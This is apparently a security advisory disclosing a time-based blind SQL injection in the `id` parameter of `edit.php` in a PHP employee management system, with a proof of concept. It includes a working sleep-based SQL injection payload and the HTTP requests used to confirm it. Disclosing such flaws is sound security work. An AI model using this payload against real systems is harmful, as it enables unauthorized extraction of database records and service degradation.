## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/edit.php` contains a SQL Injection (time-based blind) vulnerability

Impact of the vulnerability
Because user-controlled input is concatenated into an SQL statement without proper parameterization, an attacker may be able to:

- Infer/extract data via blind techniques
- Bypass intended query logic and access unauthorized records (depending on DB privileges)
- Degrade service availability by triggering expensive/time-delay queries

### Payload:

(select*from(select+sleep(10)union/**/select+1)a)

```
(select*from(select+sleep(10)union/**/select+1)a)
```

POC:
The vulnerable endpoint is `GET /edit.php?id=...`. The `id` parameter is used directly in the SQL `WHERE` clause. Verify by comparing a baseline request with a time-delay request.

- Baseline request:

GET /edit.php?id=101 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

- Time-delay verification request (URL-encoded payload):

GET /edit.php?id=<URL_ENCODED_TIME_DELAY_PAYLOAD> HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The second request responds approximately `10` slower than the baseline, indicating database-side execution of the injected expression.



![image-20260409110923179](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409110923179.png)



### **Sources download:**

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```

